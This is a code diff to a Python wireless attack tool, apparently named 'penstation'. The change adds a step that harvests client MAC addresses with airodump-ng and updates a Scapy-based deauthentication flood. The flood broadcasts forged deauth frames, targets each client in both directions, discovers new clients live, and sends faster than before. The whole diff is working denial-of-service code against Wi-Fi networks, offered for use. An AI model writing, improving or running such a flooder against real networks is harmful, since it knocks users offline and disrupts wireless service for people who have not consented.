@@ -98,108 +98,137 @@ def scan_for_ap(iface, target_ssid=None, target_bssid=None, timeout_per_ch=2):
     return None
 
 
-def flood_deauth(iface, bssid, channel, ssid=""):
+def _collect_clients_airodump(iface, bssid, channel, duration=10):
+    """
+    Use airodump-ng to collect clients for a specific AP.
+    Returns list of client MACs.
+    """
+    import glob
+    import os
+    prefix = "/tmp/penstation_deauth_scan"
+    for f in glob.glob(f"{prefix}*"):
+        os.remove(f)
+
+    _set_channel(iface, channel)
+
+    print(f"[*] Collecting clients for {bssid} ({duration}s)...")
+    proc = subprocess.Popen(
+        ["airodump-ng", "--bssid", bssid, "--channel", str(channel),
+         "--write", prefix, "--output-format", "csv", iface],
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    )
+    time.sleep(duration)
+    proc.send_signal(signal.SIGINT)
+    try:
+        proc.wait(timeout=3)
+    except Exception:
+        proc.kill()
+
+    # parse clients from CSV
+    macs = []
+    csv_files = glob.glob(f"{prefix}*.csv")
+    if csv_files:
+        from wifi_monitor import parse_airodump_csv
+        _, clients = parse_airodump_csv(csv_files[0])
+        macs = [c["mac"] for c in clients
+                if c["bssid"].lower() == bssid.lower()]
+        for f in glob.glob(f"{prefix}*"):
+            os.remove(f)
+
+    return macs
+
+
+def flood_deauth(iface, bssid, channel, ssid="", known_clients=None):
     """
     Flood deauth using Scapy:
-    - Sends AP→client AND client→AP frames for each known client
-    - Broadcasts to ff:ff:ff:ff:ff:ff every round
-    - Discovers new clients live via sniffer thread
+    - Phase 1: collect clients via airodump-ng (10s)
+    - Phase 2: attack — broadcast + per-client (both directions) + live discovery
     - Press Ctrl+C to stop
     """
     try:
         from scapy.all import (RadioTap, Dot11, Dot11Deauth, sendp,
-                                sniff, Dot11AssoResp, Dot11ReassoResp, Dot11QoS)
+                                sniff, Dot11AssoResp, Dot11ReassoResp,
+                                Dot11QoS, Dot11)
     except ImportError:
-        print("[!] Scapy not found. Install: sudo pip3 install scapy")
+        print("[!] Scapy not found. Install: sudo apt install python3-scapy")
         return
 
-    _set_channel(iface, channel)
-    print(f"[*] Channel {channel}")
+    # collect clients first
+    clients = set(known_clients or [])
+    airodump_clients = _collect_clients_airodump(iface, bssid, channel, duration=10)
+    clients.update(airodump_clients)
 
-    clients = set()
+    if clients:
+        print(f"[+] Found {len(clients)} client(s): {', '.join(clients)}")
+    else:
+        print(f"[*] No clients found yet — will discover live")
+
+    _set_channel(iface, channel)
+
     clients_lock = threading.Lock()
     stop_event = threading.Event()
     frames_sent = 0
 
-    def make_deauth(src, dst, bssid_addr):
+    def make_deauth(src, dst):
         return (RadioTap() /
-                Dot11(addr1=dst, addr2=src, addr3=bssid_addr) /
+                Dot11(addr1=dst, addr2=src, addr3=bssid) /
                 Dot11Deauth(reason=7))
 
-    def send_to_client(client_mac):
+    def send_to_client(mac):
         nonlocal frames_sent
-        # AP → client
-        sendp(make_deauth(bssid, client_mac, bssid),
-              iface=iface, verbose=False)
-        # client → AP
-        sendp(make_deauth(client_mac, bssid, bssid),
-              iface=iface, verbose=False)
+        sendp(make_deauth(bssid, mac), iface=iface, verbose=False)  # AP→client
+        sendp(make_deauth(mac, bssid), iface=iface, verbose=False)  # client→AP
         frames_sent += 2
 
     def send_broadcast():
         nonlocal frames_sent
-        sendp(make_deauth(bssid, "ff:ff:ff:ff:ff:ff", bssid),
+        sendp(make_deauth(bssid, "ff:ff:ff:ff:ff:ff"),
               iface=iface, verbose=False)
         frames_sent += 1
 
     def client_sniffer():
-        """Passively discover associated clients."""
         def handler(pkt):
             if stop_event.is_set():
                 return
             mac = None
-            if pkt.haslayer(Dot11AssoResp):
-                if pkt[Dot11AssoResp].status == 0:
-                    mac = pkt[0].addr1
-            elif pkt.haslayer(Dot11ReassoResp):
-                if pkt[Dot11ReassoResp].status == 0:
-                    mac = pkt[0].addr1
+            if pkt.haslayer(Dot11AssoResp) and pkt[Dot11AssoResp].status == 0:
+                mac = pkt[0].addr1
+            elif pkt.haslayer(Dot11ReassoResp) and pkt[Dot11ReassoResp].status == 0:
+                mac = pkt[0].addr1
             elif pkt.haslayer(Dot11QoS):
-                # data frame: check it's going to/from our AP
                 if pkt[0].addr3 and pkt[0].addr3.lower() == bssid.lower():
-                    candidate = pkt[0].addr1
-                    if (candidate and
-                            candidate.lower() != "ff:ff:ff:ff:ff:ff" and
-                            candidate.lower() != bssid.lower()):
-                        mac = candidate
+                    mac = pkt[0].addr1
 
-            if mac and mac.lower() != "ff:ff:ff:ff:ff:ff":
+            if (mac and
+                    mac.lower() != "ff:ff:ff:ff:ff:ff" and
+                    mac.lower() != bssid.lower()):
                 with clients_lock:
                     if mac not in clients:
                         clients.add(mac)
-                        print(f"\n[+] New client: {mac}")
+                        print(f"\n[+] New client discovered: {mac}")
 
         sniff(iface=iface, prn=handler, store=False,
               stop_filter=lambda p: stop_event.is_set(), monitor=True)
 
-    # start client sniffer in background
     sniffer_thread = threading.Thread(target=client_sniffer, daemon=True)
     sniffer_thread.start()
 
     label = ssid if ssid else bssid
-    print(f"[*] Flooding deauth → {label}  [Ctrl+C to stop]")
-    print(f"[*] Clients discovered live, broadcast every round")
+    print(f"[*] Flooding {label}  [Ctrl+C to stop]")
 
     try:
         while True:
-            # broadcast
             send_broadcast()
-
-            # per-client (both directions)
             with clients_lock:
-                current_clients = set(clients)
-            for mac in current_clients:
+                current = set(clients)
+            for mac in current:
                 send_to_client(mac)
-
-            elapsed = getattr(flood_deauth, "_start", time.time())
-            print(f"\r[*] Frames: {frames_sent}  Clients known: {len(current_clients)}",
+            print(f"\r[*] Frames: {frames_sent}  Clients: {len(current)}",
                   end="", flush=True)
-            time.sleep(0.1)
-
+            time.sleep(0.05)
     except KeyboardInterrupt:
         stop_event.set()
-        print(f"\n[+] Stopped. Sent {frames_sent} deauth frames, "
-              f"{len(clients)} clients targeted")
+        print(f"\n[+] Stopped. {frames_sent} frames, {len(clients)} clients")
 
 
 def deauth_menu(aps, clients, mon_iface):
